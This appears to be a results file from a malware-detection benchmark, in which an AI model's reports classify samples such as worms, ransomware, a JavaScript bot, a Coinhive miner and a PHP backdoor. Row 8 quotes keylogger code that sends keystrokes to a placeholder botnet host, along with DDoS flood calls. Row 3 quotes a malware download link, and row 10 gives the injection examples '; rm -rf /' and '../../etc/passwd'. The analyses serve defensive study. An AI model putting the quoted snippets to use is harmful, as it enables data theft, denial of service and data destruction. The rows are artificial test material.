1,I-Worm.Archiver,"1. **YES**

2. **Detailed Explanation**:

   This code contains signs of potentially malicious behavior, specifically targeting Windows systems. Here are the key points that lead to this conclusion:

   - **Suspicious Registry Modifications**: The code interacts with the Windows registry, specifically the `Run` key at `Software\\Microsoft\\Windows\\CurrentVersion\\Run`. This registry location is commonly abused by malware to establish persistence on the system by adding itself to the startup programs, which allows it to run automatically on each boot.

   - **File Copying and Execution**: The code appears to create a copy of itself (`Archiver.exe`) within the Windows directory, setting up a mechanism to re-execute if certain conditions are met. This behavior suggests self-replication, commonly found in malware that seeks to maintain persistence.

   - **ZIP File Interaction**: The function `infzip` appears to locate `.zip` files across various directories (e.g., desktop, personal folders, and the root `C:\` drive) and uses `WinExec` to execute commands involving WinZip, potentially adding malicious content to these ZIP files. This could be a method to spread the malicious program to other systems if these ZIP files are shared with others.

   - **Potential Email-Related Functions**: Although not fully utilized, there are references to MAPI (Mail Application Programming Interface) components, suggesting the code may have intended or partially implemented functionality for sending emails, possibly to propagate itself via email attachments.

   - **Self-Destructive Functionality**: The use of `ExitProcess(0)` in multiple places indicates the program can terminate itself after performing its operations, a technique sometimes used in malware to avoid detection once the main payload has executed.

   - **Other Red Flags**: The `WinMain` function’s conditional handling of parameters (`-i` and `-p`), particularly for initialization and displaying misleading messages, could serve as a means to disguise the program’s true purpose or to mislead the user into trusting the executable.

In conclusion, the combination of registry modification, self-replication, potential email propagation, and ZIP file modification strongly indicates malicious intent and behavior commonly associated with malware.",1281,448,19.280834436416626
2,I-Worm.WarGames,"### Detection Report: **YES**

#### Detailed Explanation:
This code is highly suspicious and contains numerous indicators of malicious intent. Below are the key points that suggest this code is malicious:

1. **Stopping Antivirus/Anti-malware Software**:
   - The code includes a function (`StopAV`) designed to terminate various antivirus and anti-malware processes (e.g., AVP32.EXE, Norton, ZoneAlarm, etc.). This is a typical behavior for malware attempting to disable security software to avoid detection and removal.

2. **File Copying and Self-replication**:
   - The program copies itself to a new location (`article.doc.exe`) and creates a new registry entry to ensure it runs on startup. This is a form of self-replication that makes it persistent on the infected system.
   - The `WriteProfileString` and `WritePrivateProfileString` functions are used to modify configuration files to ensure that the malware executes upon system startup.

3. **Email and Social Engineering**:
   - The code constructs and sends emails via the `MAPI` API, with attachments and a social engineering message. It targets the email recipient by sending an attachment that it claims is important, which is a common tactic for spreading malware via phishing attacks.
   - The email contains a message with an attachment (`funny.exe`), which could be harmful if executed by the recipient.

4. **Exploiting Outlook and MAPI**:
   - The malware uses the MAPI (Messaging Application Programming Interface) to interact with the Outlook application, further confirming its intention to send emails, likely to propagate itself or perform additional malicious actions.
   - The code extracts email addresses from files (e.g., looking for ""mailto:"" links) and attempts to send emails to them with an attachment.

5. **Obfuscation**:
   - The function `__superImportant_function_AvoidModifications` contains an obfuscated code segment that uses XOR and modulo operations to manipulate memory. This is typically used to make reverse engineering harder and hide the true behavior of the malware.
   - It also employs inline assembly to interact with `WININET.DLL` and check the internet connection state, which may be a part of the malware's attempt to communicate with a remote server or control center.

6. **File Search and Infection**:
   - The function `FindFile` searches for specific file types (e.g., `.htm`, `.doc`, `.xls`, `.php`) on the system and tries to find email addresses embedded in them. This suggests the malware is looking for documents that could be used to spread itself or send out malicious emails.

7. **Script Creation and Execution**:
   - It creates a VBScript (`wargames.vbs`) which is used to further propagate the malware by sending emails with attachments. This is a classic technique for spreading malware by exploiting scripting languages to perform actions on a victim's system.

8. **Registry Modification**:
   - The code creates registry keys that modify the system's behavior, such as adding a new entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall` to make the malware appear as if it's a legitimate program (e.g., ""WarGames Uninstall"").

### Conclusion:
Based on the above indicators, this code exhibits clear signs of being a piece of malware designed for self-replication, antivirus evasion, social engineering, and spreading via email. Therefore, **YES**, this code contains a vulnerability or potential attack and should be considered malicious.",3810,716,19.57901620864868
3,Worm.Win32.Warskype,"### Detection Report

1. **YES** – The code contains security risks and signs of a potential attack (malicious behavior).

2. **Explanation**:

The code includes several behaviors that indicate it may be designed for malicious activity:

#### 1. **Skype Interaction**
   - The code uses Windows messages (`WM_COPYDATA`) to interact with Skype. This is not inherently malicious, but the way it is used to send messages and commands between processes suggests that it could be manipulating or automating Skype interactions without the user's consent.
   - The function `S3arch` continuously sends random usernames to Skype, potentially using them for unsolicited or automated interaction, which is suspicious behavior.
   - The `strstr` function is used to check for specific commands (`""CHAT ""` and `""USERS ""`), and when detected, the program sends messages to all users in the chat. This can be seen as a form of unsolicited messaging (spamming) or even social engineering.

#### 2. **Sending Malicious Links**
   - The code constructs and sends a command like `CHATMESSAGE %s Check this! http://marx2.altervista.org/surprise.exe`. This is particularly dangerous as it contains a URL that points to a potential malware site (`surprise.exe`). This is clear evidence of an attempt to spread malware via Skype chat.
   
#### 3. **Hidden or Obfuscated Logic**
   - The function `__superImportant_function_AvoidModifications` contains unusual obfuscation techniques, such as XOR operations and modulo logic to modify a buffer, which serves no clear purpose other than to complicate analysis and potentially hide malicious intent. The memory barrier (`asm volatile`) is also a trick to prevent compiler optimization, which is commonly used in malware to avoid detection.
   
#### 4. **Skype Discovery and Control**
   - The program registers messages (`SkypeAttach`, `SkypeDiscover`) and attempts to attach to a running Skype instance and perform actions like sending messages to users. This is an indication that the program is designed to interact with Skype in a non-standard and potentially unauthorized manner.
   
#### 5. **Launching Skype Automatically**
   - The function `RunSkype` attempts to locate Skype in the registry and automatically launch it. It can be seen as a method to ensure Skype is running and under the control of the malicious program, which is a characteristic behavior of malware trying to take control of a system.
   
#### 6. **Exploiting the Skype API**
   - The program uses the `SkypeControlAPIAttach` and `SkypeControlAPIDiscover` to control Skype, a feature typically used by authorized Skype integrations. The fact that these are used in this context, without clear user consent, suggests the program is trying to secretly control or automate Skype actions.
   
#### 7. **Network-based Malware Spread**
   - The code suggests the potential to spread malware through Skype (via sending a link to a malicious file: `http://marx2.altervista.org/surprise.exe`). This is an attempt to deceive users into downloading and running the malware.

#### Conclusion:
The code exhibits several behaviors indicative of a malicious payload, including controlling Skype, sending unsolicited messages with a malicious URL, and attempting to automate actions without user consent. Thus, the program can be classified as malware or at least malicious in nature.",1667,682,18.975990533828735
4,RansomWar,"1. **YES**

2. **Detailed Analysis**:

The provided code contains several indicators of malicious intent and security risks:

### **Encryption of Files (Potential Ransomware Behavior)**

The `Encrypt_File` function applies Blowfish encryption to files, with a setup that resembles ransomware patterns. Here are notable issues:
   - The code selectively avoids encrypting system-critical files (`.dll`, `.exe`, `.ini`, etc.), indicating an intention to avoid detection or damage that would prevent the system from running.
   - The encrypted file is renamed to include a custom extension (`saferED_EXT`), a common trait in ransomware that alters file extensions to signal encrypted status.
   - The `Enc_Files` counter triggers a message thread when a threshold (150 files) is reached, a mechanism often seen in ransomware to communicate with the victim.

### **Drive Scanning and File Selection for Encryption**

The `S3arch` function recursively scans through drives to locate files for encryption. The approach of avoiding certain files (based on extensions) and focusing on files not already encrypted (as per the custom extension) strongly resembles behavior found in ransomware.

### **Anti-Debugging Mechanism**

The `AntiDebug` function attempts to detect if the program is running under a debugger by checking `IsDebuggerPresent()`. If debugging is detected, the code enters a loop to launch instances of `notepad.exe`, effectively hindering debugging efforts. This is a known tactic used by malware to avoid analysis and is characteristic of malicious software.

### **Self-Repeating Encryption Process (Spreading Mechanism)**

The `R4ns0m` function perpetuates encryption by constantly monitoring and searching for drives (from `C:` to `Z:`) to apply the encryption routine. This functionality, paired with a timed interval (`Sleep((1000*60)*10);` for 10 minutes), indicates that the encryption process is meant to run persistently in the background, continuously searching for new files to encrypt.

### **Conclusion**

The combined features of file encryption, selective file targeting, recursive drive scanning, anti-debugging, and persistent encryption make this code strongly resemble ransomware behavior. Therefore, it is flagged as **malicious** due to its potential to cause significant harm to a system and user data through unauthorized encryption, making files inaccessible without decryption.",1532,474,18.341120958328247
5,Win32.Shithead,"1. **YES** - This code does contain malware.

2. **Detailed Analysis:**

   This code displays behavior typical of a ""companion virus,"" specifically targeting Windows systems. The presence of malicious indicators is apparent based on several key functions and code patterns:

   - **File Enumeration and Infection**:
     - The code uses `FindFirstFileA` and `FindNextFileA` to search for `.exe` files, suggesting that it is looking for executable files within a directory. The `psaxnogia` variable is set to `""*.exe""`, which confirms that the code is targeting executable files.
     - The `infect` function shows intent to replicate itself or modify other executables. It constructs a new filename by prefixing an underscore to the target file’s name (using `newnamecreation`), creates a message box with the `MessageBoxA` function (likely as a taunt or indication of infection), and then uses `DeleteFileA` and `CopyFileA` to overwrite or copy files. This behavior is characteristic of file-infecting viruses that attempt to duplicate themselves across multiple executables.

   - **Self-Replication and Concealment**:
     - The code actively overwrites or copies itself onto new executable files, which is a self-replication technique. By prefixing filenames with an underscore, it can attempt to evade immediate detection, although this is a basic obfuscation tactic.
   
   - **Malicious Message and Indicators**:
     - The text strings within the `.Data` section contain taunting or unsettling messages (`""The companion is getting alive...""` and `""bU-hahahaahahahaha""`), which are typical of malware aiming to notify or taunt the victim.
     - The code’s `caption` and `keimeno` strings further clarify its intent as a ""simple companion virus."" This reinforces the purpose of the code as intentionally malicious, developed for assembly language ""practice"" as per the comments, but indeed exhibiting classic virus behavior.

   - **Malicious Actions with System Calls**:
     - The code utilizes `GetCommandLineA`, `ExitProcess`, and several file manipulation functions (e.g., `DeleteFileA`, `CopyFileA`). These API calls are common in malware and often abused to execute processes, manipulate files, and terminate processes after infection.

   Based on these behaviors, it is clear that this code is designed to infect other executable files on a Windows system, self-replicate, and potentially evade immediate detection. The presence of intentional infection mechanisms, file manipulation functions, and taunting messages signifies a high likelihood of malicious intent.",917,536,21.420518159866333
6,Win32.Flea,"{
  ""YES"": ""The code contains potential malicious behavior. It performs operations commonly associated with malware, such as copying files and manipulating system data. Specifically, it attempts to locate and copy executable files (using 'FindFirstFileA', 'FindNextFileA', and 'CopyFileA') based on a file mask ('*.EXE'), which suggests that the code is searching for executable files on the system to either modify or spread itself. Additionally, the code includes anti-analysis techniques like modifying program memory (through XOR and arithmetic operations on buffer values) and checking for the presence of a period ('.') in the command line, possibly to prevent detection or obfuscate its behavior. The use of 'MessageBoxA' to display an error message could be a social engineering tactic to confuse the user or to halt execution in a specific condition.""
}",758,172,7.349339485168457
7,Win32.Crash,"1. **YES**

2. **Explanation of Judgment:**

The provided assembly code contains characteristics commonly associated with malware, specifically a file-infecting virus. Below are the key aspects that contribute to this assessment:

   - **File Enumeration and Selection:** The code uses `FindFirstFileA` and `FindNextFileA` API calls to enumerate files with an `*.exe` extension. This behavior is typical for file-infecting viruses, which often scan the filesystem to identify executable files that they can infect.

   - **File Duplication and Renaming:** The code calls `CopyFileA` twice, suggesting it may be copying or replacing files. One call copies `cFileName` to another location, possibly creating a duplicate for further modification, which could be part of an infection process.

   - **Modification of Target Files:** The `modify_victim` section of the code appears to open a file, allocate memory, and copy specific content from the infected file’s name to the target executable file. This section modifies the file content, which indicates potential injection of malicious code or data.

   - **Execution and Termination:** The program includes a call to `WinExec` on the `myname` file, which is named ""crashoverwrite.exe."" Executing a file after copying and modifying it indicates that this program is not only propagating but also executing modified files. This could lead to malicious actions on the system.

   - **Use of System Resources and APIs Typical in Malware:** API calls like `GlobalAlloc`, `ReadFile`, `WriteFile`, `SetFilePointer`, and `CloseHandle` facilitate the reading, modifying, and writing of files, as well as managing memory and system handles. These APIs are commonly used in malware to manipulate files without the user's consent.

   - **Potential File-Infector Virus Characteristics:** The sequence of operations — scanning for files, checking if they are infected, modifying their content, and executing them — aligns with how file-infecting viruses typically operate. The code’s behavior strongly indicates an attempt to overwrite or alter other executable files, which could compromise the integrity of legitimate programs and potentially spread across a system.

In summary, the code contains clear indicators of a security risk due to its file-infecting behavior and manipulation of executable files, which aligns with typical malware activities.",1412,474,23.552237510681152
8,bot,"**1. YES**

**2. Explanation:**

The code provided contains multiple malicious components that indicate security risks and potential attacks, specifically in the areas of information gathering, denial-of-service, and remote control capabilities. Below is a breakdown of the identified issues:

### 1. **Hidden Iframes for Potential Command & Control**
   - Code:
     ```javascript
     document.write(""<iframe id='ifr11323' style='display:none;' src='http://YourDomain.com/BotNet/CC/index.php'></iframe>"");
     document.write(""<iframe id='ifr11323' style='display:none;' src='http://YourDomain.com/safer.html'></iframe>"");
     ```
   - **Explanation:** The use of hidden iframes that point to suspicious URLs is a common method for setting up Command & Control (C&C) systems in malware. The hidden nature (`style='display:none;'`) prevents users from noticing these iframes. The C&C server (`YourDomain.com/BotNet/CC`) could be used to control infected machines or download further malware components.

### 2. **DDoS Attack Mechanism**
   - Code:
     ```javascript
     ddos('http://TARGET-SITE.com/images/header.png', 'http://TARGET-SITE.com/images/header.png');
     ```
   - **Explanation:** The `ddos` function performs repeated requests to specified URLs, which could overload the target server (`TARGET-SITE.com`). The repeated requests are triggered by `window.setInterval()` at a 1-second interval, thus generating traffic that could slow down or crash the target server.

### 3. **Data Exfiltration via Keylogger**
   - Code:
     ```javascript
     var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c=';
     document.onkeypress = function(e) {
         var stroke = { k: e.key, t: timestamp };
         buffer.push(stroke);
     };
     window.setInterval(function() {
         var data = encodeURIComponent(JSON.stringify(buffer));
         new Image().src = attacker + data;
         buffer = [];
     }, 200);
     ```
   - **Explanation:** This section logs all keypresses and periodically sends them to a remote server (`YourDomain.com/BotNet/CC/KeyLogger`). This behavior indicates a keylogger, a tool often used to capture sensitive data (e.g., usernames, passwords) from user input.

### 4. **Repeated HTTP Requests (Flooding)**
   - Code:
     ```javascript
     function imgflood() { /*...*/ }
     setInterval(imgflood, 10); //100 requests per second
     ```
   - **Explanation:** The `imgflood` function is triggered at a high frequency (every 10 milliseconds) to send HTTP requests to the target. This code generates a massive volume of requests, contributing to potential server resource exhaustion, which is characteristic of a Denial of Service (DoS) attack.

### 5. **Potential Obfuscation and Encoding Mechanisms**
   - Code:
     ```javascript
     function __ultimateCoreSecurityHandler_DO_NOT_TOUCH(inputArray) { /*...*/ }
     ```
   - **Explanation:** Although this function does not directly contain attack code, the complex and unnecessary calculations, along with obfuscation (`btoa` encoding), suggest it could be part of a larger scheme to mask data or make reverse engineering difficult.

### **Conclusion:**
The code contains multiple malicious components that clearly indicate malware behavior, including hidden iframe injections, DDoS attack code, keylogging with data exfiltration, and high-frequency flooding requests. These components combined present a high security risk and would likely compromise any system where this script is executed.",726,767,26.865774393081665
9,miner,"1. **YES**

2. **Explanation**:

The provided code contains elements commonly associated with malware, specifically cryptojacking:

### Analysis:
- **Coinhive Script**: The `<script src=""https://coinhive.com/lib/coinhive.min.js""></script>` reference loads a script from Coinhive, a well-known service used for cryptocurrency mining in users' browsers. Coinhive was widely used for cryptojacking — a malicious activity where websites mine cryptocurrency without users' consent, using their CPU resources.
  
- **Mining Script Execution**:
  - The script initializes a new CoinHive instance (`CoinHive.Anonymous`) with a specific throttle rate and starts mining based on certain conditions (`safer.start()`). Even though it has conditions like `!safer.isMobile()` and `!safer.didOptOut(14400)`, these are not sufficient to guarantee user consent.
  - The mining activity consumes significant CPU resources, potentially slowing down users' devices and increasing power consumption without explicit permission, which is considered unethical and a security risk.

- **Suspicious Function (`activateCriticalProcess`)**:
  - The additional JavaScript code contains a function `activateCriticalProcess()` which reveals a hidden element and changes the background color while displaying an alert. While it does not directly indicate malware, such obfuscated or misleading functions can be used to hide malicious activities or trick users into thinking they are performing legitimate actions.

### Conclusion:
The presence of the Coinhive script alone indicates a significant security risk due to unauthorized cryptocurrency mining. Thus, the code is deemed potentially malicious and can be classified as malware.",245,330,11.55944538116455
10,Backdoor.PHP.Llama,"### Detection Report

1. **YES**

2. **Detailed Explanation:**

The code contains several security vulnerabilities that can potentially lead to severe security risks:

1. **Command Injection Vulnerability**:
   - The code allows user input to directly influence system commands via `$_POST['king']` (used as `$curcmd`). The command is executed with `popen()` without sanitizing or validating the user input, allowing an attacker to inject arbitrary system commands.
   - For instance, an attacker could submit a value like `; rm -rf /` in the `king` field, which would execute destructive commands on the server.

2. **Directory Traversal**:
   - The user can also manipulate the directory using the `$_POST['dir']` variable. Without proper validation or restrictions, an attacker could potentially traverse directories on the server and access or execute files outside the intended directory (e.g., by submitting `../../etc/passwd` in the `dir` field).

3. **File Upload Vulnerability**:
   - The file upload functionality does not perform any checks on the file type or size, which makes the application susceptible to file upload attacks. An attacker could upload malicious scripts or executable files (e.g., PHP files), which could be executed on the server.
   - The uploaded file is saved in a user-controlled directory, and there is no indication of any security mechanisms like file extension validation, content checks, or renaming mechanisms to prevent malicious uploads.

4. **Information Disclosure**:
   - The script leaks sensitive system information via the use of `php_uname()` and `ini_get()` functions. This exposes the server's operating system and PHP configuration, which could aid an attacker in crafting more targeted attacks.
   - It reveals whether ""safe_mode"" is enabled, the current ""open_basedir"" setting, and any disabled functions, providing clues about potential exploits.

5. **Lack of Security Controls**:
   - The form submission and actions (`exe`, `upl`) are controlled by simple POST parameters. There's no CSRF (Cross-Site Request Forgery) protection, which could allow an attacker to trick users into executing commands or uploading files without their knowledge.
   - There’s no authentication or authorization system in place, which means anyone with access to the form can execute commands and upload files.

6. **Potential for Remote Code Execution (RCE)**:
   - Due to the direct use of user-supplied input in executing shell commands, the script is vulnerable to remote code execution (RCE). An attacker could exploit this to execute arbitrary commands on the server.

### Recommendations:
- **Sanitize User Input**: Always sanitize and validate user input, especially before using it in system commands or file paths.
- **Disable Dangerous Functions**: Disable or restrict dangerous PHP functions such as `popen()`, `exec()`, `system()`, etc., if not required.
- **Implement File Upload Security**: Validate uploaded files for type and content, restrict file types (e.g., only images), and save files outside the web root or rename them to avoid direct execution.
- **Limit Permissions**: Restrict permissions to limit user access to sensitive system areas or configuration files.
- **Use Authentication**: Implement proper authentication and authorization mechanisms to prevent unauthorized access to these functionalities.
- **Error Handling**: Avoid leaking sensitive information such as server configuration and system details in production environments.

This code should not be used in any production environment without significant security improvements.",875,711,24.04568576812744
